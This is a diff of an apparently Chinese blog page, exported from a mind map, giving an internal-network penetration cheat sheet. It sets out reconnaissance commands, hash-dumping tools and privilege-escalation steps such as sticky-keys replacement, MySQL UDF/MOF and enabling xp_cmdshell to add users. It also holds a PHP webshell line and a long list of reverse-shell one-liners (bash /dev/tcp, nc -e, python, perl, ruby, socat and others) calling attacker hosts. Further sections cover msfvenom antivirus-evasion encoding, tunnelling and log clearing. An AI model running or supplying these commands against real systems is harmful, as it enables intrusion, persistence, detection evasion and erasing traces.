@@ -167,100 +167,117 @@
       
         <a id="more"></a>
 <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-windows"><a href="#1-1-windows" class="headerlink" title="1.1.windows"></a>1.1.windows</h3><ul>
-<li>1.1.1用户操作<ul>
+<li><p>1.1.1用户操作</p>
+<ul>
 <li>query user #查看当前在线的用户<br>whoami #查看当前用户<br>net user #查看当前系统的用户<br>net1 user #查看当前系统的用户<br>net user /domain #查看当前域里面的用户<br>net user administrator    #查看当前用户的详细信息<br>net localgroup #查看本地用户组<br>net localgroup administrators #查看管理组中的成员</li>
 </ul>
 </li>
-<li>1.1.2网络操作<ul>
+<li><p>1.1.2网络操作</p>
+<ul>
 <li>ipconfig /all #查看当前机器的ip<br>netstat -ano #查看有哪些网络连接端口<br>net view #查看在同一工作组中的机器<br>net view /domain #判断是否有域<br>route print #查看路由表<br>arp -a #查看arp表</li>
 </ul>
 </li>
-<li>1.1.3系统操作<ul>
-<li>set  #查看系统的环境变量<br>systeminfo  #查看当前操作系统信息，关注【补丁号】！！！！<br>tasklist #查看进程名称以及PID号<br>net start #查看服务</li>
-<li>软件安装信息查询<br>dir /a “c:\program files” #查看当前系统的安装的软件<br>dir /a “c:\program files (x86)”</li>
-<li>收集hash<ul>
-<li>wce<ul>
+<li><p>1.1.3系统操作</p>
+<ul>
+<li><p>set  #查看系统的环境变量<br>systeminfo  #查看当前操作系统信息，关注【补丁号】！！！！<br>tasklist #查看进程名称以及PID号<br>net start #查看服务</p>
+</li>
+<li><p>软件安装信息查询<br>dir /a “c:\program files” #查看当前系统的安装的软件<br>dir /a “c:\program files (x86)”</p>
+</li>
+<li><p>收集hash</p>
+<ul>
+<li><p>wce</p>
+<ul>
 <li>lassa.exe获取</li>
 </ul>
 </li>
-<li>pwdum7<ul>
+<li><p>pwdum7</p>
+<ul>
 <li>lassa.exe获取</li>
 </ul>
 </li>
-<li>mimikatz<ul>
+<li><p>mimikatz</p>
+<ul>
 <li>lassa.exe获取</li>
 </ul>
 </li>
-<li>QuarksPwDump<ul>
+<li><p>QuarksPwDump</p>
+<ul>
 <li>lassa.exe获取</li>
 </ul>
 </li>
-<li>getpass<ul>
+<li><p>getpass</p>
+<ul>
 <li>SAM/system获取</li>
 </ul>
 </li>
-<li>SAMinside<ul>
+<li><p>SAMinside</p>
+<ul>
 <li>SAM/system获取</li>
 </ul>
 </li>
+<li><p>破解hash</p>
+<ul>
+<li><a href="https://www.objectif-securite.ch/en/ophcrack" target="_blank" rel="noopener">https://www.objectif-securite.ch/en/ophcrack</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li>1.1.4主动搜集<ul>
-<li>搜索文件<ul>
-<li><pre>@echo off
-set "FileName=password.txt"
-echo searching..
-for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-if exist %%a:\ (
-for /f "delims=" %%b in ('dir /a-d /s /b "%%a:\*%FileName%" 2^>nul') do (
-if /i "%%~nxb" equ "%FileName%" (
-  echo,%%b
-)
-)
-)
-)</pre></li>
 </ul>
 </li>
-<li>判断主机存活<ul>
-<li><pre>@echo off
-for /l %%i in (1 1 254) do ping -v 4 -n 1 192.168.5.%%i || find "TTL" >>hots.txt
-pause</pre></li>
+<li><p>1.1.4主动搜集</p>
+<ul>
+<li><p>搜索文件</p>
+<ul>
+<li>@echo off<br>set “FileName=password.txt”<br>echo searching..<br>for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (<br>if exist %%a:\ (<br>for /f “delims=” %%b in (‘dir /a-d /s /b “%%a:*%FileName%” 2^&gt;nul’) do (<br>if /i “%%~nxb” equ “%FileName%” (<br>echo,%%b<br>)<br>)<br>)<br>)</li>
+</ul>
+</li>
+<li><p>判断主机存活</p>
+<ul>
+<li>@echo off<br>for /l %%i in (1 1 254) do ping -v 4 -n 1 192.168.5.%%i || find “TTL” &gt;&gt;hots.txt<br>pause</li>
 </ul>
 </li>
 </ul>
 </li>
-<li>1.1.5用户习惯收集<ul>
-<li>用户桌面信息收集    <ul>
+<li><p>1.1.5用户习惯收集</p>
+<ul>
+<li><p>用户桌面信息收集    </p>
+<ul>
 <li>C:\Users\用户名\Desktop</li>
 </ul>
 </li>
-<li>下载目录信息收集<ul>
+<li><p>下载目录信息收集</p>
+<ul>
 <li>C:\Users\用户名\Download\</li>
 <li>迅雷</li>
 <li>百度云</li>
 </ul>
 </li>
-<li>收藏夹信息收集<ul>
-<li>chrome<ul>
+<li><p>收藏夹信息收集</p>
+<ul>
+<li><p>chrome</p>
+<ul>
 <li>C:\Users\用户名\AppData\Local\Google\Chrome\User Data\Default</li>
 </ul>
 </li>
-<li>ie<ul>
+<li><p>ie</p>
+<ul>
 <li>C:\Users\用户名\Favorites</li>
 </ul>
 </li>
-<li>firefox</li>
+<li><p>firefox</p>
+</li>
 </ul>
 </li>
-<li>浏览器记录收集</li>
-<li>聊天工具收集<ul>
+<li><p>浏览器记录收集</p>
+</li>
+<li><p>聊天工具收集</p>
+<ul>
 <li>qq</li>
 <li>微信</li>
 </ul>
 </li>
-<li>系统日志收集<ul>
+<li><p>系统日志收集</p>
+<ul>
 <li>登录日志</li>
 <li>服务日志</li>
 </ul>
@@ -269,23 +286,35 @@ pause</pre></li>
 </li>
 </ul>
 <h3 id="1-2-linux"><a href="#1-2-linux" class="headerlink" title="1.2.linux"></a>1.2.linux</h3><ul>
-<li>ifconfig<br>route #查看路由<br>whoami #<br>id #查看当前用户id<br>id test #查看test用户信息<br>w #查看当前系统活动用户<br>lastlog #查看用户登陆日志<br>grep MemTotal /proc/meminfo #查看系统内存总量</li>
-<li>cat /etc/passwd #查看用户列表<br>cat /etc/shadow #获取用户hash<br>cat /etc/group #查看用户组<br>grep -v -E “^#” /etc/passwd | awk -F: ‘$3 == 0 { print $1}’   # 列出超级用户<br>awk -F: ‘($3 == “0”) {print}’ /etc/passwd   #列出超级用户</li>
-<li>netstat –an<br>netstat -antlp #查看tcp连接</li>
-<li>系统类型和内核版本<br>cat /etc/issue  #查看系统名称<br>cat /etc/lsb-release #查看系统名称、版本号<br>uname -a #查看内核信息<br>ls /root |grep vmlinuz #查看内核信息</li>
-<li>进程信息<br>ps aux #查看进程信息<br>ps -ef</li>
-<li>安装的软件包和服务<br>dpkg -l #查看安装的软件包<br>rpm -qa #查看安装的软件包<br>cat /etc/service #查看系统存在的服务</li>
-<li>用户登录信息<br>/var/log/wtmp<br>/var/log/btmp</li>
-<li>服务配置<br>cat /etc/syslog.conf<br>cat /etc/chttp.conf<br>cat /etc/lighttpd.conf<br>cat /etc/cups/cupsd.conf<br>cat /etc/inetd.conf<br>cat /etc/apache2/apache2.conf<br>cat /etc/my.conf<br>cat /etc/httpd/conf/httpd.conf<br>cat /opt/lampp/etc/httpd.conf</li>
-<li>网络配置<br>cat /etc/network/interfaces #网卡配置<br>cat /etc/resolv.conf #dns配置<br>hostname #查看主机名</li>
-<li>网络拓扑收集<br>arp –a</li>
-<li>日志信息收集<br>/var/log/*<ul>
+<li><p>ifconfig<br>route #查看路由<br>whoami #<br>id #查看当前用户id<br>id test #查看test用户信息<br>w #查看当前系统活动用户<br>lastlog #查看用户登陆日志<br>grep MemTotal /proc/meminfo #查看系统内存总量</p>
+</li>
+<li><p>cat /etc/passwd #查看用户列表<br>cat /etc/shadow #获取用户hash<br>cat /etc/group #查看用户组<br>grep -v -E “^#” /etc/passwd | awk -F: ‘$3 == 0 { print $1}’   # 列出超级用户<br>awk -F: ‘($3 == “0”) {print}’ /etc/passwd   #列出超级用户</p>
+</li>
+<li><p>netstat –an<br>netstat -antlp #查看tcp连接</p>
+</li>
+<li><p>系统类型和内核版本<br>cat /etc/issue  #查看系统名称<br>cat /etc/lsb-release #查看系统名称、版本号<br>uname -a #查看内核信息<br>ls /root |grep vmlinuz #查看内核信息</p>
+</li>
+<li><p>进程信息<br>ps aux #查看进程信息<br>ps -ef</p>
+</li>
+<li><p>安装的软件包和服务<br>dpkg -l #查看安装的软件包<br>rpm -qa #查看安装的软件包<br>cat /etc/service #查看系统存在的服务</p>
+</li>
+<li><p>用户登录信息<br>/var/log/wtmp<br>/var/log/btmp</p>
+</li>
+<li><p>服务配置<br>cat /etc/syslog.conf<br>cat /etc/chttp.conf<br>cat /etc/lighttpd.conf<br>cat /etc/cups/cupsd.conf<br>cat /etc/inetd.conf<br>cat /etc/apache2/apache2.conf<br>cat /etc/my.conf<br>cat /etc/httpd/conf/httpd.conf<br>cat /opt/lampp/etc/httpd.conf</p>
+</li>
+<li><p>网络配置<br>cat /etc/network/interfaces #网卡配置<br>cat /etc/resolv.conf #dns配置<br>hostname #查看主机名</p>
+</li>
+<li><p>网络拓扑收集<br>arp –a</p>
+</li>
+<li><p>日志信息收集<br>/var/log/*</p>
+<ul>
 <li>http日志<br>/var/log/apache2/access.log</li>
 <li>mysql日志<br>/var/log/mysql/error.log</li>
 <li>apt日志<br>/var/log/apt/history.log</li>
 </ul>
 </li>
-<li>/home目录文件信息收集</li>
+<li><p>/home目录文件信息收集</p>
+</li>
 </ul>
 <h3 id="1-3第三方"><a href="#1-3第三方" class="headerlink" title="1.3第三方"></a>1.3第三方</h3><ul>
 <li>ssh</li>
@@ -295,38 +324,55 @@ pause</pre></li>
 <li>mssql</li>
 </ul>
 <h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
-<li>系统漏洞，ms系列<ul>
-<li>ms08-067<ul>
+<li><p>系统漏洞，ms系列</p>
+<ul>
+<li><p>ms08-067</p>
+<ul>
 <li>rpc</li>
 </ul>
 </li>
-<li>ms09-012<ul>
+<li><p>ms09-012</p>
+<ul>
 <li>pr.exe/巴西烤肉提权</li>
 </ul>
 </li>
-<li>ms09-020<ul>
+<li><p>ms09-020</p>
+<ul>
 <li>iis5/6</li>
 </ul>
 </li>
-<li>ms12-020<ul>
+<li><p>ms12-020</p>
+<ul>
 <li>rdp蓝屏</li>
 </ul>
 </li>
-<li>ms17-010<ul>
+<li><p>ms17-010</p>
+<ul>
 <li>永恒之蓝/wannacry</li>
 </ul>
 </li>
-<li>cve-2019-0708<ul>
+<li><p>cve-2019-0708</p>
+<ul>
 <li>rdp/命令执行</li>
 </ul>
 </li>
-<li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></li>
-<li><a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></li>
+<li><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+</li>
+<li><p><a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
+</li>
+<li><p>粘滞键提权(sethc.exe)</p>
+<ul>
+<li>使用cmd.exe覆盖sethc.exe，当在输入密码界面多次shift时，会调用sethc.exe</li>
 </ul>
 </li>
-<li>应用程序<ul>
-<li>pcanywhere</li>
-<li>serv-U<ul>
+</ul>
+</li>
+<li><p>应用程序</p>
+<ul>
+<li><p>pcanywhere</p>
+</li>
+<li><p>serv-U</p>
+<ul>
 <li>默认本地管理端口是：43958，默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P</li>
 </ul>
 </li>
@@ -334,35 +380,46 @@ pause</pre></li>
 </li>
 </ul>
 <h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
-<li>内核提权<ul>
-<li>脏牛漏洞<ul>
+<li><p>内核提权</p>
+<ul>
+<li><p>脏牛漏洞</p>
+<ul>
 <li>内核版本&gt;2.6</li>
 </ul>
 </li>
-<li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
+<li><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+</li>
 </ul>
 </li>
 </ul>
 <h3 id="服务提权"><a href="#服务提权" class="headerlink" title="服务提权"></a>服务提权</h3><ul>
-<li>mysql<ul>
-<li>UDF提权<ul>
-<li>windows<ul>
-<li>UDF<ul>
+<li><p>mysql</p>
+<ul>
+<li><p>UDF提权</p>
+<ul>
+<li><p>windows</p>
+<ul>
+<li><p>UDF</p>
+<ul>
 <li>mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/</li>
 <li>mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\</li>
 </ul>
 </li>
 </ul>
 </li>
-<li>linux<ul>
+<li><p>linux</p>
+<ul>
 <li>/usr/lib/mysql/plugin/</li>
 </ul>
 </li>
-<li>要求有写权限，单引号未被过滤</li>
+<li><p>要求有写权限，单引号未被过滤</p>
+</li>
 </ul>
 </li>
-<li>MOF<ul>
-<li>windows专属<ul>
+<li><p>MOF</p>
+<ul>
+<li><p>windows专属</p>
+<ul>
 <li>流程：<br>1、 首先找个可写的目录，将我们的MOF文件上传上去。<br>2、 执行以下sql语句，mof文件内的命令便会执行。<br>select load_file(‘C:/wmpub/nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’</li>
 <li>mofcomp.exe xxxxx.mof 执行mof文件</li>
 <li>调用Imofcompiler接口的$complieFile方法</li>
@@ -373,24 +430,31 @@ pause</pre></li>
 </li>
 </ul>
 </li>
-<li>mssql<ul>
-<li>xp_cmdshell<ul>
+<li><p>mssql</p>
+<ul>
+<li><p>xp_cmdshell</p>
+<ul>
 <li>开启：<br>EXEC sp_configure ‘show advanced options’, 1;<br>RECONFIGURE;<br>EXEC sp_configure ‘xp_cmdshell’, 1;<br>RECONFIGURE;</li>
 <li>exec xp_cmdshell  ‘net user test test /add’</li>
 </ul>
 </li>
-<li>xp_regwrite</li>
-<li>xp_regread</li>
+<li><p>xp_regwrite</p>
+</li>
+<li><p>xp_regread</p>
+</li>
 </ul>
 </li>
-<li>tomcat<ul>
+<li><p>tomcat</p>
+<ul>
 <li>弱口令爆破</li>
 </ul>
 </li>
 </ul>
 <h2 id="3-权限维持"><a href="#3-权限维持" class="headerlink" title="3.权限维持"></a>3.权限维持</h2><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><ul>
-<li>cmd命令<ul>
-<li>写webshell<ul>
+<li><p>cmd命令</p>
+<ul>
+<li><p>写webshell</p>
+<ul>
 <li>1.使用cmd命令写webshell，带有&lt;&gt;以及“空格”的时候，需要使用^进行转义<br>例如：echo ^&lt;?php^ eval($_POST[a]);?^&gt; &gt; shell.php</li>
 </ul>
 </li>
@@ -398,18 +462,411 @@ pause</pre></li>
 </li>
 </ul>
 <h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><h3 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h3><ul>
-<li>生成后门<ul>
+<li><p>生成后门</p>
+<ul>
 <li>以管理员方式运行</li>
 </ul>
 </li>
 </ul>
-<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><h2 id="4-隐匿攻击"><a href="#4-隐匿攻击" class="headerlink" title="4.隐匿攻击"></a>4.隐匿攻击</h2><h2 id="5-横向移动"><a href="#5-横向移动" class="headerlink" title="5.横向移动"></a>5.横向移动</h2><h2 id="6-域渗透"><a href="#6-域渗透" class="headerlink" title="6.域渗透"></a>6.域渗透</h2><h3 id="瞄准域控-DC机-发起攻击"><a href="#瞄准域控-DC机-发起攻击" class="headerlink" title="瞄准域控(DC机)发起攻击"></a>瞄准域控(DC机)发起攻击</h3><h2 id="7-痕迹清理"><a href="#7-痕迹清理" class="headerlink" title="7.痕迹清理"></a>7.痕迹清理</h2><h3 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h3><h3 id="linux-2"><a href="#linux-2" class="headerlink" title="linux"></a>linux</h3><ul>
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><ul>
+<li>meterpreter</li>
+<li>msfvenom</li>
+<li>exploit</li>
+</ul>
+<h2 id="4-跨边界传输"><a href="#4-跨边界传输" class="headerlink" title="4.跨边界传输"></a>4.跨边界传输</h2><h3 id="跨边界代理-转发"><a href="#跨边界代理-转发" class="headerlink" title="跨边界代理/转发"></a>跨边界代理/转发</h3><ul>
+<li><p>端口转发</p>
+<ul>
+<li><p>lcx</p>
+<ul>
+<li><p>listen</p>
+<ul>
+<li>-listen <local port1>  <local port2></li>
+<li>将port1监听到的数据发往port2</li>
+</ul>
+</li>
+<li><p>tran</p>
+<ul>
+<li>-tran   <local port>   <remote host>  <remote port></li>
+<li>将本地port开启监听，并且将监听到的数据发往远程端口</li>
+</ul>
+</li>
+<li><p>slave</p>
+<ul>
+<li>-slave  <remote host1> <remote port1> <remote host2> <remote port2></li>
+<li>将远程主机A的port与远程主机B的port双向转发</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>frp反向代理</p>
+<ul>
+<li>frps -c frps.ini</li>
+<li>frpc -c frpc.ini</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>内网代理</p>
+<ul>
+<li><p>http tunnel</p>
+<ul>
+<li><p>reDuh</p>
+</li>
+<li><p>reGeorg</p>
+<ul>
+<li>1.python2 安装urllib3库</li>
+<li>2.上传tunnel.nosocket.php代理脚本到web服务器</li>
+<li>3.访问url，确认web服务器上tunnel.nosocket.php能够执行</li>
+<li>4.python2执行reGeorgSocksProxy.py脚本，连接tunnel.nosocket.php</li>
+<li>5.配置本地代理，使用代理工具进行sock5代理</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>ssh tunnel</p>
+<ul>
+<li>xshell直接启动隧道转发</li>
+<li>ssh -D设置socket隧道</li>
+<li>ssh -L设置端口正向转发</li>
+<li>ssh -R设置端口反向连接</li>
+</ul>
+</li>
+<li><p>DNS tunnel</p>
+<ul>
+<li>dns2tcp</li>
+</ul>
+</li>
+<li><p>pingtunnel</p>
+<ul>
+<li>服务端-type server</li>
+<li>连接端-type client</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul>
+<li><p>1.nc</p>
+<ul>
+<li><p>正向连接</p>
+<ul>
+<li><p>攻击机</p>
+<ul>
+<li>nc -vv 受害者ip 受害者port</li>
+</ul>
+</li>
+<li><p>受害者</p>
+<ul>
+<li>nc -lvvp 受害者port -e /bin/bash</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>反向连接</p>
+<ul>
+<li><p>攻击机</p>
+<ul>
+<li>nc -lvvp 攻击机port</li>
+</ul>
+</li>
+<li><p>受害者</p>
+<ul>
+<li>nc -vv 攻击机ip 攻击机port -e /bin/bash</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>聊天/传文件</p>
+<ul>
+<li><p>发送方</p>
+<ul>
+<li>nc -lvvp 自己的port &lt; 文件</li>
+</ul>
+</li>
+<li><p>接收方</p>
+<ul>
+<li>nc -vv 发送方ip 发送方port &gt; 文件</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>2.bash</p>
+<ul>
+<li><p>接收端(hackip,公网)</p>
+<ul>
+<li>nc -lvvp 端口</li>
+</ul>
+</li>
+<li><p>发送端(受害者）</p>
+<ul>
+<li>bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1 </li>
+<li>0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>3.socat</p>
+<ul>
+<li><p>tcp</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>socat TCP-LISTEN:端口 - </li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li><p>linux</p>
+<ul>
+<li>socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</li>
+</ul>
+</li>
+<li><p>windows</p>
+<ul>
+<li>socat.exe exec:’cmd.exe’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>udp</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>socat udp-listen:端口 -</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li><p>linux</p>
+<ul>
+<li>socat udp-connect:ip:port exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</li>
+</ul>
+</li>
+<li><p>windows</p>
+<ul>
+<li>socat.exe udp-connect:192.168.5.108:30000 exec:’cmd.exe’,pty,stderr,sane</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>4.python</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>python -c  ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“接收端ip”,接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>5.PHP反弹</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>php -r ‘$sock=fsockopen(“接收端ip”,接收端端口);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>6.JAVA反弹</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[]) p.waitFor()</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>7.perl反弹</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>8.ruby反弹</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>ruby -r socket -e ‘exit if fork;c=TCPSocket.new(“ip”,”port”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>9.telnet反弹</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>10.lua反弹</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>lua -e “local s=require(‘socket’);local t=assert(s.tcp());t:connect(‘ip’,port);while true do local r,x=t:receive();local f=assert(io.popen(r,’r’));local b=assert(f:read(‘*a’));t:send(b);end;f:close();t:close();”</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>11.awk</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>awk ‘BEGIN{s=”/inet/tcp/0/ip/port”;while(1){do{s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&s;close(c)}}while(c!=”exit”);close(s)}}’</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>12.ksh/tsh/zsh/sh</p>
+<ul>
+<li><p>接收端(攻击机)</p>
+<ul>
+<li>nc -lvvp port</li>
+</ul>
+</li>
+<li><p>发送端(靶机)</p>
+<ul>
+<li>ksh -c ‘ksh &gt;/dev/tcp/ip/port 2&gt;&amp;1 &lt;&amp;1’</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>13.通过msfvenom生成反弹shell的payload</p>
+<ul>
+<li>1.msfvenom -l payloads | grep 工具</li>
+<li>2.msfvenom -p payload LHOST=监听机IP LPORT=监听端口</li>
+</ul>
+</li>
+<li><p>14.icmpsh</p>
+<ul>
+<li><p>接收端</p>
+<ul>
+<li>./icmpsh-m.py <source IP address> <destination IP address></li>
+</ul>
+</li>
+<li><p>发送端</p>
+<ul>
+<li>icpmsh.exe -t 接收端ip</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><ul>
+<li>1.nc传输</li>
+<li>2.上传点上传</li>
+<li>3.wget下载</li>
+<li>4.脚本php/python/perl/ruby发起请求并读写文件</li>
+<li>5.ftp</li>
+<li>6.sftp</li>
+<li>7.svn</li>
+<li>8.git</li>
+<li>9.sync</li>
+<li>10.powershell</li>
+<li>11.net use 挂载盘符</li>
+<li>12.bitsadmin</li>
+<li>13.scp</li>
+</ul>
+<h2 id="5-隐匿攻击"><a href="#5-隐匿攻击" class="headerlink" title="5.隐匿攻击"></a>5.隐匿攻击</h2><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><ul>
+<li><p>msfvenom</p>
+<ul>
+<li><p>encoder<br>编码器</p>
+<ul>
+<li><p>-e 编码器 -i 编码次数</p>
+</li>
+<li><p>多次编码</p>
+<ul>
+<li>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.5.172 lport=4444 -e x86/shikata_ga_nai -i 15 -f raw | msfvenom -a x86 –platform windows -e x86/alpha_upper -i 10 -f exe -o shell.exe</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>bad-chars<br>花指令</p>
+<ul>
+<li>-b ‘\x00’</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>the-backdoor-factory</p>
+</li>
+<li><p>veil</p>
+</li>
+<li><p>upx</p>
+<ul>
+<li>加壳</li>
+</ul>
+</li>
+<li><p>.net壳</p>
+</li>
+<li><p>分离免杀</p>
+<ul>
+<li>shellcode提取，动态加载</li>
+</ul>
+</li>
+</ul>
+<h3 id="msf-cs"><a href="#msf-cs" class="headerlink" title="msf/cs"></a>msf/cs</h3><ul>
+<li>msf发往cs</li>
+<li>cs发往msf</li>
+</ul>
+<h2 id="6-横向移动"><a href="#6-横向移动" class="headerlink" title="6.横向移动"></a>6.横向移动</h2><h2 id="7-域渗透"><a href="#7-域渗透" class="headerlink" title="7.域渗透"></a>7.域渗透</h2><h3 id="瞄准域控-DC机-发起攻击"><a href="#瞄准域控-DC机-发起攻击" class="headerlink" title="瞄准域控(DC机)发起攻击"></a>瞄准域控(DC机)发起攻击</h3><h2 id="8-痕迹清理"><a href="#8-痕迹清理" class="headerlink" title="8.痕迹清理"></a>8.痕迹清理</h2><h3 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h3><h3 id="linux-2"><a href="#linux-2" class="headerlink" title="linux"></a>linux</h3><ul>
 <li>/var/log/btmp</li>
 <li>/var/log/wtmp</li>
 <li>~/.bash_history</li>
 <li>history -c</li>
 </ul>
-<p><em>XMind: ZEN - Trial Version</em></p>
 
       
 
